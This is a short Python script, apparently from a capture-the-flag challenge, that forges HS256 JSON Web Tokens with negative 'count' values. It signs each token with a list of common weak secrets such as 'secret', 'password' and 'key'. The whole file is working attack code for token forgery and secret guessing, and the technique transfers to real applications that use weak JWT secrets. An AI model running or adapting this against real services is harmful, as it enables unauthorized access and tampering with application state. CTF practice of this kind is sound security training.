#!/usr/bin/env python3
"""
Focused JWT Attack for Lower Numbers Challenge
Only negative numbers as per hint
"""

import base64
import json
import hmac
import hashlib

def create_jwt_negative(count, secret=""):
    """Create JWT with negative count"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"count": count}
    
    # Encode
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')
    
    # Sign
    message = f"{header_b64}.{payload_b64}"
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    
    return f"{header_b64}.{payload_b64}.{signature_b64}"

def main():
    print("🔢 JWT Negative Number Generator")
    print("=" * 40)
    
    # Focus on negative numbers only as per hint
    negative_counts = [-1, -2, -5, -10, -50, -100, -1000]
    
    # Try common weak secrets
    secrets = ["", "secret", "password", "key", "jwt", "bootup", "ctf", "lower", "numbers"]
    
    print("Generating JWTs with negative counts:")
    print()
    
    for secret in secrets:
        print(f"Secret: '{secret}'")
        for count in negative_counts:
            jwt = create_jwt_negative(count, secret)
            print(f"  Count {count:5}: {jwt}")
        print()

if __name__ == "__main__":
    main()
